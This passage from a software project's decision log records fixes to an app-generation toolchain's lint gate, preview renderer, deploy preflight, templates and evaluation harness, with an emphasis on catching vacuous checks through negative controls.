  artifact, and the run log shows the assertion written before the sentence
  went out.

  **The hole: the bundle-source check searched with the PROSE pattern set
  only.** For `rev-poll-cant-make-it` every render pattern required a literal
  space (`can.?t make it`) while the only occurrence in the app that
  demonstrably HAD the behaviour was the identifier `'cant-make-it'` — so the
  fourth check could not have fired even on the positive case, and the evidence
  sheet said "the bundle source does not mention it" as though it had looked.
  This is the failure the requests README already names for the action surface
  ("a prose pattern applied to an action map matches nothing ever, and 'no
  action provides it' would then be true by construction"), repeated one
  surface over on the reasoning that all four surfaces are prose. Bundle source
  is not prose; it is a mixture, and it needs both sets.

  Fixed: `sourceHit` now searches the union of both compiled sets. Widening is
  safe without a further self-test because a source hit produces ABSTAIN and
  never PRESENT — over-matching costs a candidate request and can never
  manufacture a false ABSENT or corrupt an issued observation. Two tests pin
  it, and reverting the union fails exactly those two.

  **Three further limits found and recorded rather than fixed**, because each
  would be new machinery and none of them bit this corpus. (1) `initialState`
  and the live state document are never pattern-matched — `decide()` searches
  the action map, the recipe, the render and the source, and every app in the
  corpus is data-driven, so for state-resident behaviour the painted render is
  the only check that can see it. (2) The twelve render cells are two state
  configurations, not twelve — live-reduced and live-reduced-with-all-actions —
  and the second adds nothing the action-map check does not already have, so a
  behaviour filtered out of the render at both reports ABSENT on all four
  surfaces while sitting in plain sight in the definition. (3) Action patterns
  match `id + serialised ops`, so a generic parameterised action would provide
  a behaviour without the witness word appearing anywhere; that is inapplicable
  in v0, where input-carrying actions do not exist, and becomes live the day
  they do.

- **D133: the display-only marker costs a sentence, and the sentence is
  scored.** `memberInteraction` was a bare `z.enum(['none'])`. Its first outing
  was on the exact app the rule was written to catch — an expense split nobody
  can add an expense to, shipped inert a SECOND time one session after the
  failure was named, declared this time so the warning never fired. The marker
  had been copied out of `PARADIGM.md`'s snippet before any lint ran, from a
  code block sitting eleven lines below the paragraph naming that app shape as
  the wrong reason to reach for it.

  Three changes, in the order they are encountered rather than the order they
  were written:

  **Doctrine first.** The declaration is now presented as a sentence rather
  than a flag, the example's `because` is a placeholder that cannot be pasted
  without writing something, and the paragraph naming the incident sits under
  it. The rule a reader meets before the hatch is the rule that motivates it.

  **The schema second.** `memberInteraction` is now
  `{ mode: 'none', because: string }` with a non-empty `because`, declared on
  `SurfaceSpecSchema` for the `duplicatesTolerated` reason (`z.object` strips
  what it does not declare, so an undeclared marker is present in a written
  spec and absent from the validated read-back of that same spec). The bare
  string the field used to be is now REJECTED — leaving it accepted would have
  kept the old path open beside the new one.

  **The rubric third.** Check 8, `display-only-was-asked-for`, applies only to
  a spec that declares the marker, and its subject is the `because` sentence
  held next to the request. Conditional rather than universal on purpose: a
  check every sheet must answer becomes a check every sheet answers the same
  way, and check 7 is the standing proof — "the screen is the thing that was
  asked for" passed an inert expense split, because a screenshot of a board
  nobody can touch looks exactly like one somebody can. `surface preview` emits
  check 8 in the template exactly when it applies, so the forcing function
  lands where the author is already filling in blanks rather than at publish
  time, after the work it was meant to shape.

  **Control, as required:** the verdict run's inert-but-declared expense spec,
  updated to the new marker shape, is refused by publish with
  `rubric-incomplete` naming `display-only-was-asked-for`; it publishes once
  the check is scored; and an app making no such claim is asked for nothing
  extra. The gate additionally warns on a marker with no `because` and says
  what is missing, and an empty or whitespace `because` is not a `because`.

  **What this does not do**, stated because the last rule of this shape was
  believed to do more than it did: `because` is not machine-checkable and is
  not trying to be. Its job is to make an author who cannot name the host event
  notice that they cannot, at the moment they are typing.

- **D134: the desk preflight — a claim with a shelf life gets a check.**
  `packages/openclaw/dev/surfaces-desk-preflight.mjs`. "The publish pipeline is
  proven end to end on fakeships" was true when written and silently stopped
  being true: a develop merge added `mar/group/action-5.hoon` and flipped the
  client to poke that mark in one commit, and the running ships were never
  re-synced. Nothing could see it, because nothing ever compared the ship's
  desk against the repo's.

  It assembles the branch's desk the way `deploy.sh` and rube do
  (`scripts/assemble-desk.sh`) and compares it file-by-file against each
  running ship's MOUNTED `%groups` desk. Two paths are excluded, each named
  with the reason it carries no compiled behaviour: `commit.txt` is a git stamp
  that moves on every commit to anything (checked for ANCESTRY instead, which
  catches the thing a stamp can actually tell you — a ship built from another
  branch), and `desk.docket-0` carries the released frontend glob, which this
  workflow never fetches because the client comes from the vite dev server.

  **The mount is not the whole answer**, and this is the part worth recording.
  The mounted directory is what clay wrote out, but it is also what anyone
  rsynced in: `rsync` without a following `|commit` leaves the mount matching
  the branch while clay still holds the old desk — the original failure with an
  extra step. There is no way to read a clay file back over eyre, so the second
  half is a per-machine gitignored ledger. `--record` writes the ship's live
  `%groups` pike hash beside the content digest verified at that moment; later
  runs require both to still match. A commit nobody recorded shows up as a
  moved pike hash; a sync nobody committed shows up as a digest with no ledger
  entry. Neither passes silently. The ledger is gitignored because pike hashes
  are takos — they carry parents and timestamps and mean nothing on another
  machine.

  **Demonstrated failing**, as required: against a decoy pier missing
  `mar/group/action-5.hoon` and one Hoon file behind, it names both files and
  exits 1; against a ledger with a moved pike hash it reports `pike-moved` and
  exits 1; against a moved content digest, `digest-moved` and exit 1; an
  unmounted desk exits 2. The current fakeships pass on all 641 files with the
  stamp an ancestor of HEAD. Eleven unit tests cover the pure half in CI, where
  the live half cannot run.

  Wired into `surfaces-run.sh` ahead of every other preflight: a run taken on a
  stale desk measures the loop against a backend the repo no longer describes.

- **D135: the fence assertion was vacuous when written, and was caught by
  running it.** D131's container check first read `TLON_SURFACE_SCOPE_FILE` out
  of the running process, found it set after the recreate, and passed. The CLI
  the bot actually invokes is a `bun --compile` binary at
  `$TLON_SKILL_DIR/bin/tlon`, and the one in the container had been built at
  13:35 that day — before the fence existed. So the assertion was confirming
  that an environment variable pointed at a file the binary never read. Species
  4 of the vacuous-guard taxonomy, claims-a-mechanism-never-exercised,
  reproduced inside an hour of writing the mechanism.

  The assertion now EXERCISES the fence with three credential-free probes
  against the container's own CLI: a malformed scope file must be refused
  naming the parse error, an absent one must be refused fail-closed, and — the
  control — **no scope named at all must fall through to the ordinary
  failure**. Without the third, the first two would pass equally against a CLI
  that failed on everything.

  **Negative control run:** the same three probes against
  `packages/tlon-skill/dist/tlon`, an August 18 binary that predates the whole
  `surface` command group, produce `Run "tlon --help" for usage information`
  three times — no scope-file refusal anywhere, so the assertion fails, which
  is the required outcome. The rebuilt binary passes all three, and the full
  preflight passes live with the control note recorded in its evidence file.

  **The general lesson, which is the reason this is a numbered entry rather
  than a footnote:** the guards this project keeps writing are guards about
  configuration, and configuration is the thing that is easy to observe. What
  is worth observing is behaviour. The distinction is not academic — the
  configuration was correct and the behaviour was absent, simultaneously, and
  only one of those two facts was visible to the check.

  **Why the 6a.5 "stale-binary guard" did not catch this, asked and answered.**
  It could not have, because it is not a guard. Its whole implementation is a
  design choice recorded in `surfaces-assert-unsatisfied.ts`'s header: _"Both
  CLI reads run the CLI FROM SOURCE (`bun packages/tlon-skill/scripts/
main.ts`), never a compiled binary… running from source makes the staleness
  question **unaskable rather than guarded**."_ There is no detector, nothing it
  keys on, and nothing that could fire. It caught 6a.5's twenty-minute-stale
  CLI by ceasing to use it.

  So neither candidate explanation is right. The assertion did not run outside
  the guard's path, and the guard does not key on something the fence commit
  left alone: **the remedy was scoped to the INSTRUMENT and never extended to
  the ACTOR.** The preflight reads through source; the bot reads through
  `$TLON_SKILL_DIR/bin/tlon`; nothing ever looked at the second. That makes
  this a scope hole as well as a vacuous guard, and the two have the same fix,
  which is the one now in place — exercise the mechanism through the path the
  real actor uses.

  A documentation hazard worth naming with it: "unaskable rather than guarded"
  is a true and careful sentence about the preflight's own reads, and one
  session later it was read as a guard covering the container. A remedy that
  works by removing a question leaves nothing behind that says what it does not
  cover — so `surfaces-assert-unsatisfied.ts`'s header now says it, naming the
  bot's compiled binary as the consumer this does not reach and pointing at
  `assertFenced` as the place that does. That is the durable half of this
  entry: the fix to the assertion stops one instance, and the fix to the
  paragraph stops the next reader from making the same inference about some
  other remedy of the same shape.

### What template authoring surfaced about the tools

- **D136: six findings from writing templates, five of them about the gate and
  the preview rather than about the apps.** Session 5 found five plan errors
  this way; the prompt expected more and there were more. Recorded together
  because they share a shape — each is a place where the tool's answer depends
  on something other than the app it is judging.

  **1. `surface lint` gives different verdicts depending on the working
  directory, and blames the author for it.** The shipped `poll` template FAILS
  from the repo root and PASSES from `packages/tlon-skill`:
  `error smoke-render bundle: render threw (initial state): TypeError:
Attempting to define property on object that is not extensible` — a
  Preact/React JSX-runtime mismatch. Reproduced directly, and independently by
  two template authors, one of whom established that
  `bun --tsconfig-override packages/tlon-skill/tsconfig.json` does NOT fix it,
  so the cause is not simply the root tsconfig's `jsx: react-jsx` without a
  `jsxImportSource`. `surface preview` is unaffected from either cwd because it
  renders through the prebuilt `dist` artifact rather than transpiling the
  shell's `.tsx` primitives — which is also why the render probe works from the
  repo root and lint does not.

  **The serious half is the classification, not the failure.** It is reported
  as a `violation`, an author error, and this codebase's own
  `SURFACE_ERROR_CLASS` doctrine tells a bot that an author error means "your
  files are wrong, rewrite and retry". So a correct app gets regenerated
  because of where the tool was invoked from. That is precisely the destructive
  noise the `environment` class exists to prevent, and it is the second time
  the same mistake has been found in this project.

  **2. A shipped template carried a twelve-cell machine defect that CI could
  not see.** `workout-tracker` failed the preview machine pass on
  `tap-targets` in all twelve cells — two buttons 0px apart in a bare `<div>` —
  and it is the template whose idiom both new template authors copied first.
  Fixed with a flex wrapper at `gap: var(--space-m)`; gate and suite green.
  The reason it survived: `surface-templates.test.ts` auto-discovers every
  template and checks the GATE, but never runs the preview defect pass, and
  CI's headless render step runs `surface-preview.test.ts`, which does not
  iterate templates. Wiring the machine pass over every shipped template is
  the fix, and this is the evidence that it is worth doing rather than
  hypothetical.

  **3. The populated capture can systematically erase a member.**
  `foldPopulatedState` applies actions in DECLARATION ORDER to a rotating
  actor, so whichever action is declared last lands last on a determinate
  actor — and if it is destructive (`del /responses/$actor`), that member is
  gone from every populated cell. `RUBRIC.md` names the symptom ("A member who
  logged nothing") but neither the cause nor the remedy, so an author reads a
  real member-shaped hole as their own bug. Routed to the agent already inside
  that function, with the constraint that the fix must not stop activating
  declared controls — the gate's `not fully exercised` skip fires for any
  action no control invoked, and the templates suite requires the skip list to
  be empty.

  **4. `PARADIGM.md` §3 asserts a guarantee nothing enforces.** It says flatly
  "No `Date`, no `Date.now()`, no `setTimeout`/`setInterval`, no elapsed time."
  At HEAD the gate's entire rule set is `action-idempotency`, `byte-cap`,
  `chart-sizing`, `entry-point`, `jargon`, `member-interaction`,
  `navigation-vector`, `pointer-hygiene`, `smoke-render`, `spec-schema` — there
  is no lexical time rule at all, and the file's only `setTimeout` mention is a
  comment about a different rule's evadability. A bundle containing
  `Date.now() > 0 ? 0 : 1` passes clean. **This session's own author repeated
  the false claim in two agent briefs before checking it**, which is the
  session's lesson landing on the person writing it down.

  **5. `surface preview` cannot render a template's `state.json`.** It renders
  `initialState` and the mechanical fold, and there is no `--state` flag. Every
  template ships a `state.json` its NOTES describe as "what CI renders", so the
  CLI and the shell-side render job reach that file by different routes and an
  author cannot preview what CI will draw. Both template authors independently
  worked around it by writing temp specs with `initialState` swapped.

  **6. A template cannot declare an action with no rendered control.** An
  author wanted spare cost slots so a mid-trip cost could be added by one host
  event rather than a revision. It lints clean as an APP (the skip is not a
  violation) but `surface-templates.test.ts` requires the skip list to be
  empty, so the pattern is unbuildable as a TEMPLATE. Recorded rather than
  resolved: the skip rule and the template test currently disagree about what
  a state-conditional control means, and that disagreement is worth settling
  deliberately rather than by whichever one someone hits first.

### `surface fork`

- **D137: fork is built, and §9 was wrong in three places that only building it
  exposed.** `surface fork <source> --into <destination> [--regenerate]`,
  `packages/tlon-skill/scripts/commands/surface-fork.ts`, 35 tests, ten
  negative controls each verified applied before the result was believed. The
  plan text is amended in place with each change marked rather than quietly
  rewritten.

  **`--into` names a channel, not a group, and fork does not create it.** §9
  said `--into <group>` and "create the channel". Building that would have
  meant a second copy of `surface create`'s D50 burned-name discipline; the
  deciding reason against is different, though — a destination the command
  creates cannot be resolved at write intent before it exists, so the write
  fence (D131) could not apply to fork the way it applies to publish. Splitting
  it gives fork one read-intent resolve of the source and one write-intent
  resolve of the destination, which is the property that matters.

  **"`--regenerate` runs the full generation loop" is not buildable in a CLI.**
  The loop is the bot's, between tool calls. The command does the loop's first
  move and routes; §9 now says so. It also needed a refusal §9 did not
  anticipate — `recipe-absent`, because re-deriving a recipe from the running
  app would invent the thing the mode exists to carry.

  **"Re-lints the copied bundle" understated the re-gate**, and the
  understatement had a shape consequence. Rubric check 7 is context-scored, so
  the source's sheet cannot travel; a fresh sheet must be bound to an id that
  does not exist until fork mints it; so a plain copy is necessarily TWO runs
  with a `surface preview` between them. That is not a design preference, it
  falls out of the rubric's own `(surfaceId, bundleSha256)` binding.

- **D138: the fourth-bite test would have passed under the defect it was
  written to predict, and the test that says so is the useful artifact.** The
  standing prediction was that fork would strip a gate opt-out marker. It does
  not — but the reason is not that fork is careful: it is that
  `duplicatesTolerated` and `memberInteraction` are both DECLARED on
  `SurfaceSpecSchema` (D67, D72), so neither can tell a raw derivation from a
  validated one. **A fourth-bite test built only from the markers the
  prediction named would have passed under the exact defect it predicted.**
  Only an undeclared key discriminates, so the fixture carries one
  (`x-fourth-bite`), and there is now an explicit test pinning that the
  fulcrum is the undeclared key rather than the markers.

  Two things the test observed that nobody predicted. `memberInteraction`
  travelling makes rubric check 8 (D133) apply to the fork, which turns "the
  source's sheet does not travel" from doctrine into a mechanical refusal — a
  seven-check sheet is `rubric-incomplete` on a forked display-only app. And
  the read-back mutation (comparing the validated spec instead of the raw cell)
  reproduces D72's signature exactly: six landing tests report
  `publish-unconfirmed` on writes that landed.

  **Re-verified after the conditions changed.** `provenance` was declared on
  the schema later the same session (D139), which removes one more candidate
  discriminator. Re-running the validated-derivation mutation with provenance
  declared still fails the fourth-bite test, and still on the undeclared-key
  assertion — so declaring the field did not hollow out the test.

- **D139: `provenance` is declared on `SurfaceSpecSchema`, third time for the
  same reason.** It was in plan §4.1's interface and not in the schema, so
  every fork was writing an undeclared key. Safe today only because every
  comparison on fork's write path happens to be raw-to-raw — a property of
  today's call sites, not of the field, which is precisely the argument D67 and
  D72 already made twice. Capped at 1KB (`SURFACE_CAPS.provenance`): a bound on
  abuse, not on legitimate content, since nothing correct comes near it and a
  spec near `specTotal` must not be pushed over by a field nobody chose to add.
  Shape enforced — an unverifiable field with an unconstrained shape is a place
  to put arbitrary member-visible text. `channel` stays optional, because
  naming the source nest discloses that a channel by that name exists
  somewhere and the forker should have to opt into saying so.

  Consequence beyond hygiene: lineage is now readable off a validated spec,
  which the §9 client fork affordance needs in order to display anything at
  all.

### The kanban case, re-examined

- **D140: the verdict run's strongest observation produced a board you cannot
  finish a task on, and the rubric passed it.** Found while deciding whether to
  promote the generated kanban into a template. Verified directly against the
  captured artifacts rather than taken on report.

  `kanban-v1/bundle.js`: `const next = { todo: 'doing', doing: 'done', done: 'todo' }`.
  `kanban-v2/bundle.js`: `const next = { todo: 'doing', doing: 'blocked', blocked: 'done', done: 'todo' }`.
  **One button per card.** So the revision that added the Blocked column made
  Blocked _mandatory_: after it, no card reaches Done without first being
  marked Blocked, and Done wraps around to To do. The requested feature was
  spliced into a single-button cycle, and the cycle is the whole navigation.

  **Rubric check 7 passed it**, with the note quoted verbatim from
  `artifacts/rubrics/rev5.json`: _"Blocked is visibly present as its own section
  between Doing and Done."_ That is true of the screen and silent about the
  board.

  **What this does and does not qualify.** It does NOT touch the format
  verdict. The question D130 answers is edit-versus-regenerate, and the loop
  edited: four call sites changed, all 18 original actions kept by id, four
  member-moved cards surviving the migration in place. Every one of those
  claims still holds. What it qualifies is the use of this case as evidence of
  QUALITY. The verdict-run report and D130 present it as the strongest single
  observation and describe ids preserved and live state surviving, without
  noting that the app the edit produced is worse than the one it replaced. A
  format that supports a precise edit and a model that makes a poor design
  choice inside it are separable, and only the first was being measured.

  **The generalisable part, and it is the third instance of one shape.** Check
  7 — "the screen is the thing that was asked for" — has now passed three
  defects: an expense split nobody could add an expense to, the same app again
  with the inertness declared, and a board whose requested column became a
  mandatory checkpoint. The common structure is not carelessness. **Every one
  of those defects is about what happens when you press something, and check 7
  is scored from a still image.** The preview matrix renders STATES and never
  TRANSITIONS: twelve captures, no interaction between any two of them. A
  static capture cannot see reachability, so no amount of care in scoring it
  can catch this class.

  Recorded rather than fixed, and deliberately. Closing it means preview
  rendering a transition graph — press each control, capture the resulting
  state, and report the columns or states that no sequence reaches — which is
  a substantial addition to the tool and the wrong thing to bolt on at the end
  of a session that has already added six guards. **It is the first candidate
  for the next session**, and it is a better one than another rule, because it
  gives the rubric something it currently cannot see rather than another
  question to answer about the same picture.

  The template does not inherit the defect: the generated app's DATA MODEL was
  kept (status at a fixed shared path, one action per card-column pair, a
  literal handler table — the structure that survived the live migration) and
  the cycle was replaced with one destination button per column.

### The eval harness

- **D141: the harness measures by re-deriving, and its loudest outcome is
  neither pass nor fail.** `packages/openclaw/dev/surfaces-corpus/` (33
  records), `surfaces-score.mjs` (36 tests), `surfaces-eval-probe.ts`,
  `surfaces-eval-run.sh`, a recorded baseline, and a negative-control fixture
  pair. The full corpus run is the M2 exit measurement and is executed outside
  build sessions.

  **The corpus is 27 in scope — exactly three per template across all nine —
  plus 6 deliberately out of scope, with 8 sentences carried verbatim from 6a**
  and pinned by a test, so a later tidy-up cannot silently break comparability
  with 6a's numbers.

  **The out-of-scope six are the part worth understanding.** Four sit
  deliberately close to an in-scope neighbour. The load-bearing one:
  `oos-poll-lookup` and `poll-movie-night` carry the same trigger word with
  opposite correct answers. 6a found "poll" routing AWAY twice, and the obvious
  repair is to make the word magnetic — a corpus containing only the in-scope
  member would score that repair as a clean win. The pair makes the two numbers
  move in opposite directions, so the tradeoff is visible instead of being
  optimised against.

  **`expect.template` is reported and never gated**, because several requests
  have a defensible second answer and scoring a judgement call pass/fail
  invites optimising against the scorer. Every record carries a required
  `expect.why`: an expectation with no argument is unfalsifiable, and when the
  run disagrees nothing says whether the run or the expectation was wrong.

  **Re-derive, don't trust.** The gate and the rubric are recomputed from the
  artifact bytes using the same implementations `surface publish` uses. Where
  the recomputation disagrees with what the run CLAIMED, the row is a
  `contradiction` — ranked above `fail`, exit 1. Five cross-checks, including
  `published-over-failing-gate` and `published-other-bytes`. This is the
  scoreboard equivalent of D135's lesson: measure the behaviour through the
  path the actor used, not the actor's own report of it.

  **`unscored` is never `pass`, and there is deliberately no headline pass
  rate anywhere in the output.** A missing request is `missing`, loudly; the
  corpus is always the denominator. Out-of-scope requests get `n/a` on every
  quality axis even when the run built something — an app that should not exist
  has no business padding "how good are the apps this pipeline builds" — with
  budget the deliberate exception, since an out-of-scope request that burned
  the cap is exactly the cost worth surfacing.

  **The cap is first class, per the reviewer's condition.** `cap-killed` ranks
  above `fail` and below `contradiction`, derived from the turn's own seconds
  OR the runner's flag, since the runner sits outside the turn and often cannot
  see the kill. Per-phase seconds come from the transcript's own timestamps
  rather than anything the runner writes down — the same re-derive rule — and
  the split isolates `beforeFirstSurfaceCommand`, which is routing plus
  generation, the phase the verdict run found expensive and the one no command
  times on its own. **Medians, not means:** one 300s kill drags a mean across
  33 requests. A transcript without timestamps yields `null`, not zeros.

  **The negative control was run in both directions, and the second direction
  is the one that makes it a control.** `broken-run/` carries six independent
  breakages, each shaped to LOOK like a success — artifacts present, transcripts
  showing the pipeline, four of six reporting `outcome: "published"` with a
  read-back observation. Six different mechanisms catch them. But "the broken
  run scored broken" is satisfied by a scorer that scores everything broken, so
  a clean fixture runs beside it: `BROKEN: pass 0 | fail 2 | cap-killed 1 |
contradiction 3, exit 1` against `CLEAN: pass 2 | fail 0 | contradiction 0,
exit 0`. Both run in CI with the real probe, and a missing `bun` fails loudly
  rather than skipping.

  **Two refusals rather than defaults, both correct.** The probe exits 2 if the
  gate gains a rule that neither the static nor the behavioural list names —
  defaulting would file a behavioural rule under `lint` on a scoreboard whose
  entire purpose is keeping those apart, and `time-display` landing mid-session
  is the demonstration that this happens rather than a hypothetical. And on the
  cwd defect (D136.1) the harness pins cwd AND the probe refuses with exit 2
  rather than reporting a violation it does not believe, tested in both
  directions so the guard survives the underlying fix landing.

  **Part V's specification was wrong in three places.** "lint / fold / gate
  results" are not three products — there is one gate with sixteen rules, now
  decomposed into rules decided by reading (lint), rules that run the app
  (fold), and their union (what publish enforces). "Routing outcome" and
  "publish observation" cannot be produced in a build session at all; the smoke
  subset leaves them `unscored`, which the harness reports rather than papers
  over. And the screenshot-rubric input is not a separate file — the bot fills
  `rubric.template.json` in place, so an unfilled sheet correctly fails the
  rubric axis, which is why both in-scope smoke rows read `fail`.

### Preview, conformance, and host-supplied time

- **D142: the conformance assertion D69 asked for would have been vacuous, and
  the honest version is three assertions with three different fulcrums.**
  D69 wanted preview's populated-state fold and the client reducer driven
  through the same fixtures and asserted equal. But preview does not have a
  second fold: `surface-preview.ts` imports `reduceSurface` from
  `@tloncorp/api/client/surface/reducer` and folds with it. A suite asserting
  the two agree would assert that a function equals itself — green forever,
  including on the day someone replaces the import with a hand-rolled copy,
  which is the only failure the assertion exists to catch. Species 1 of the
  taxonomy, computed-from-itself.

  Shipped instead: **the import is pinned** (source-read, whitespace- and
  quote-normalised, following the file's existing "assembled by the same
  imports packages/app uses" pattern), **the migration gate is shown to be the
  reducer's** (preview's `preserveState` stand-in snapshot driven through
  `reduceSurface` with the author changed, the revision changed, and the
  snapshot absent — all three must return `migration-pending`, so preview's
  populated state exists because the reducer accepted a snapshot satisfying
  §4.4/§6 rather than because preview waved the gate), and **D69's divergence
  is asserted rather than described** (production carries the snapshot fold,
  preview folds the new `initialState`; the test asserts they are NOT the same
  screen, so "knowingly optimistic" is pinned instead of being prose).

- **D143: host-supplied `now`, and two places the prompt's specification could
  not be met literally.**

  **"Shell-minor" has no representation.** `SHELL_VERSION` is a single major
  and bumping it would break every spec's `bundle.shellVersion: 1` pin. It
  stays 1, with the compatibility argument written into `version.ts`: the
  change is additive in all three skew directions — old bundle on new shell,
  new bundle on old host, old host with new shell all render.

  **"The shell re-renders on an interval" cannot be true and deterministic at
  once.** A shell-owned interval must read a clock or extrapolate from wall
  time, either of which destroys the fixed-`now` reproducibility the feature
  exists for. **The interval is the HOST's**, gated on the spec's declared
  `timeDisplay` flag; the shell repaints only when handed a `now` and never
  advances one itself. The flag stays gate-visible, which is what the
  requirement actually needed.

  Three consumers inject a fixed `now` — preview (`PREVIEW_FIXED_NOW`), the
  gate's smoke render (`GATE_NOW`), and the preflight witness — so every
  painted-output comparison stays deterministic.

- **D144: the determinism control's first version was wrong, and its own
  negative control caught it.** The claim under test is that a host-supplied
  `now` makes a clock-dependent app's captures reproducible across preview
  RUNS. The first implementation called `renderSurfacePreview` four times in
  ONE process — and mutating `PREVIEW_FIXED_NOW` to `Date.now()` still passed,
  because a module-level constant is evaluated once per process and both
  in-process runs therefore read the same wall clock. The control was
  measuring nothing.

  Rewritten so each run is its own `bun` subprocess, which is also what a
  preview run actually is. Both arms then behave: injected — twelve cells
  byte-identical across runs ≥1.1s apart; ambient (`Date.now()`, the banned
  pattern, present only as the negative arm) — all twelve differ. And both
  mutations now fail: pinning `PREVIEW_FIXED_NOW` to the wall clock fails the
  injected arm, and neutralising the ambient bundle fails the must-differ
  assertion.

  **Third instance this session of a guard caught vacuous by exercising it**
  (D135, D138, this). The pattern in all three: the guard's subject was
  observed rather than run.

- **D145: the `Date` ban is now enforced, and the gate's own harness can no
  longer blame the author for its environment.**

  Rule 16 `time-display` has two legs. The lexical leg errors on `Date`,
  `setTimeout`/`setInterval`, `requestAnimationFrame`/`requestIdleCallback` and
  `performance.now` — this is what makes `PARADIGM.md` §3's sentence true for
  the first time (D136.4). The behavioural leg renders at two host `now` values
  a day apart and compares painted copy: moving without declaring is an error,
  declaring without moving is a warning. **Both legs are needed and the fixture
  set proves it**: `ambient-date-read` paints `Date.now() > 0 ? 'yes' : 'no'`,
  which is stable across a day, so the behavioural leg is blind to it by
  construction.

  §3 is reordered to D133's rule — the constraint, then WHY ambient time is
  banned (the sandbox's clock is the viewer's, so divergence is silent and
  per-viewer), then that writes are never display, then the `timeDisplay`
  hatch, then **exactly what the gate does and does not catch** (aliased
  globals, computed member access, a `Date` read stable over a day,
  `Intl.DateTimeFormat`). A hatch is not taught before the rule that motivates
  it, and the limits are stated where the hatch is offered.

  **`gate-harness-unavailable`.** D136.1's cwd-dependent failure could not be
  reproduced consistently after rebuilding `packages/api` and
  `packages/surface-shell` dist, so the cause is not claimed. The CLASS is
  fixed: the behavioural phase now renders a known-good canary bundle in its
  own window first, and if the canary fails, every behavioural rule is skipped
  with a reason, no violations are emitted, and the CLI throws
  `gate-harness-unavailable`, classed `environment`. Verified live — from the
  repo root the poll template now reports _"Your files are not implicated — do
  not rewrite the app. This is the gate's environment, not the bundle"_ instead
  of a `smoke-render` violation. The canary needs its own window: sharing one
  leaves its shell root in the document the real run renders into, which was
  measured to change an activation-shortfall reason.

- **D146: the destructive-fold hole is closed, and D136.3's remedy was the
  wrong one.** Ordering destructive actions first does NOT work — round N's
  `del` lands on the actor round N-1 just wrote for, so the hole moves rather
  than closing. The fold now replays every CONSTRUCTIVE action once per actor
  after the rounds, so no actor-shaped hole survives any rotation. It runs only
  when a spec mixes destructive and constructive actions (a `del`-only spec is
  legitimately empty), drops no declared action, and records
  `restoredAfterDestructive` in `PopulatedFold` and the manifest so the extra
  invokes are attributable to the tool rather than mistaken for the spec's. It
  ships its own in-suite control, reconstructing the old fold through the real
  reducer and asserting a member IS missing.

  `RUBRIC.md`'s "preview's artifact" entry described the old behaviour and was
  therefore **wrong the moment this landed** — a stale doc that would have sent
  authors to excuse a real defect. Rewritten: the member-shaped hole is now a
  finding about the app again, and the entry instead names the artifact that
  does survive — for any (item × state) app, folding every action in order
  piles everything into one bucket, and no spec ordering avoids it.

- **D147: the template machine pass runs in CI, one subprocess per template.**
  `workout-tracker` shipped a tap-target defect in all twelve cells — two
  buttons 0px apart, under the 6px minimum — and lints clean, passes the
  template gate checks, and passes the shell-side render test. Three separate
  agents found it independently, each by running preview by hand, because it is
  the template whose idiom a new author copies first. Nothing in CI could see
  it: `surface-templates.test.ts` checked the GATE, and the browser step ran
  only `surface-preview.test.ts`, which does not iterate templates.

  Now every shipped template is rendered and defect-scored, in CI, gated on
  `TLON_PREVIEW_BROWSER` like its neighbour. **One template per SUBPROCESS**,
  measured rather than assumed: seven templates in one process wedge Chromium
  and fail on the third, while that same template alone passes in under ten
  seconds. Shell errors and unprobed cells are asserted before defects, because
  "no defects" over a blank page is the vacuous pass.

  **Negative control:** removing the flex gap from `workout-tracker` fails the
  new leg naming `tap-targets`; restoring it passes. The defect that motivated
  the leg is the defect the leg catches.

### The last two templates, and the doctrine debt they closed

- **D148: nine templates, and six gaps that only writing the last two
  exposed.** `habit-tracker` and `countdown` complete the list. Both gate-clean
  at zero violations, warnings and skips; machine pass clean on all
  twenty-four cells; `surface-templates.test.ts` is 37 assertions over nine
  templates.

  **`surface templates show` was hiding the sentence D133 exists to make
  authors write.** It printed `actions: (none declared)` for a display-only app
  and never printed `memberInteraction.because` — showing an inspecting bot
  exactly the ambiguity the marker was added to remove, at the moment it is
  deciding what to copy. Now an empty action map reads either
  `(none — display-only by declaration)` with the sentence beneath it, or
  `(none declared)`, and those are different things. A guard is only as good as
  the surface that reports it, and this one was reporting the pre-guard world.

  **The templates test required every `state.json` to name a ship**, which
  pushed a countdown toward inventing people to satisfy a lint. Waived for a
  DECLARED display-only app and no other — an app that merely happens to have
  no actions still has to show somebody, because that is also what a forgotten
  action looks like.

  **`PARADIGM.md` §3 over-claimed reproducibility, and the over-claim was
  load-bearing for one of this session's own controls.** It said two preview
  runs "produce byte-identical screenshots". Across five runs on identical
  bytes, cell-to-cell byte equality WITHIN one run flaked once in about sixty
  cells on visually indistinguishable images; cross-run identity of the same
  cell held every time. So the claim is now stated at the strength it holds —
  compare a cell against ITSELF across runs, which is what D144's control does,
  and build nothing that diffs one cell's bytes against another's.

  **Three smaller corrections.** `RUBRIC.md`'s "populated identical to empty"
  entry called that a finding about the spec, which is wrong for an app that
  declares itself display-only — it is the app being what it says, its twelve
  cells collapse to six pairs, and honest scoring is six images plus a
  `--state` run. §2's host-is-the-clock section assumed a SCHEDULE throughout,
  when lazy rollover is the shape a bot can actually deliver — now written up
  with its tolerance test ("say out loud what a late close costs"; if you
  cannot, the period is load-bearing and this is not the pattern) and its two
  consequences, that a merged entry's marks are the union and that a run counts
  days on the board rather than calendar days. And §5's float ban appeared to
  forbid what `Progress` requires: a proportion handed to a primitive is
  geometry, not a derived value — divide for the bar, never for the label.

  **A display-only template broke two suites that had never seen one, and
  both breakages were the same assumption.** `surface-templates.test.ts`
  required every `state.json` to name a ship;
  `packages/surface-shell/test/templates.test.ts` required every template to
  render buttons and a member crew. Both were written when every template had
  member actions, and both are false of a countdown by design. Waived in each,
  granted ONLY by the declaration, and the shell-side waiver asserts the
  STRONGER claim rather than skipping: a declared display-only app must have
  exactly zero controls, declare zero actions, fire zero invokes, and paint an
  identical screen to a read-only viewer — because a display-only app that
  fired an invoke would be lying about itself.

  Worth recording how it was found: both template authors reported their work
  green, and both were right about the suite they ran. The shell-side suite was
  last run before `countdown` existed. It surfaced only in a full cross-package
  verification after the commits were already made.

  **The line `countdown` draws, which is the one worth keeping:** a date that
  has gone by is something a board may SHOW; it is not something a board may
  WRITE. "Passed" is derived at paint time, per-viewer like the theme, recorded
  nowhere — two members can briefly disagree and neither is wrong. "Closed" as
  a stored fact is a host event and nothing else. The test: _does this change
  what is IN the board, or what is ON the screen?_

### The aged-board revision (Part I.5)

- **D149: the strongest single observation in the programme, on the least
  friendly app, with the confound recorded before the run.**
